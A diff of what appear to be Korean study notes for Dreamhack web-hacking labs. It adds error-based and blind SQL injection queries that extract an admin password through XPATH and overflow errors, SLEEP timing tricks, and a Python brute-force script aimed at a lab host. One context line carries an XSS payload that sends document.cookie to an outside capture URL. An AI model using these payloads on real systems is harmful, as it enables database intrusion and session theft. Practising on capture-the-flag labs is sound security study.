@@ -197,6 +197,56 @@ filtered = ["'", "=", "\""]
 
 location.href='https://https://gdcamfr.request.dreamhack.games?memo='+document.cookie
 
+### Error based SQL Injection
+```sql
+ -- ERROR ~ :8.0.3 출력 됨.
+    SELECT extractvalue(1, concat(0x3a, version()));
+
+    SELECT extractvalue(1, concat(0x3a, (SELECT password FROM users WHERE username='admin')));
+    -- ERROR ~ : :Password
+
+    SELECT * FROM user WHERE uid='' UNION SELECT extractvalue(1, concat(0x3a, (SELECT upw FROM user WHERE uid="admin")));
+    -- (1105, "XPATH syntax error: ':DH{c3968c78840750168774ad951...'")
+```
+
+### Error based Blind SQL Injection
+```sql
+-- MySQL의 Double 자료형 최댓값을 초과해 에러 발생.
+select if(1=1, 9e307*2, 0);
+-- Error Double value is out of range
+
+select if(1=0, 9e307*2, 0);
+-- 0
+```
+
+### Short-circuit evaluation
+로직 연산의 원리 이용해 공격(AND, OR)
+```sql
+SELECT 0 AND SLEEP(1);
+SELECT 1 AND SLEEP(10); -- 10 sec 걸림
+
+SELECT 1=1 or 9e307*2; -- 1출력
+SELECT 1=0 or 9e307*2; -- Double value is out of range Error
+```
+
+### Blind SQL Injection (upw가 한글 포함)
+```py
+# 길이 알아내기
+from requests import get
+
+url = "http://host3.dreamhack.games:20564/"
+pw_len=0
+
+while True:
+  pw_len+=1
+  # 문자열 인코딩에 따른 정확한 길이 계산 위해서는 char_length 사용해야 함
+  query = f"admin' and char_length(upw)={pw_len} -- -"
+  res = get(f"{url}?uid={query}")
+  if "exists" in res.text:
+    break
+print(f"password length: {pw_len}")
+
+```
 
 
 
@@ -233,5 +283,3 @@ const {stack} = new globalThis.OldError();
 ### 첫 번째 글자 구하기 (아스키 114 = 'r', 115 = 's'')
 SELECT * FROM user_table WHERE uid='admin' and ascii(substr(upw,1,1))=114-- ' and upw=''; # False
 SELECT * FROM user_table WHERE uid='admin' and ascii(substr(upw,1,1))=115-- ' and upw=''; # True
-
-
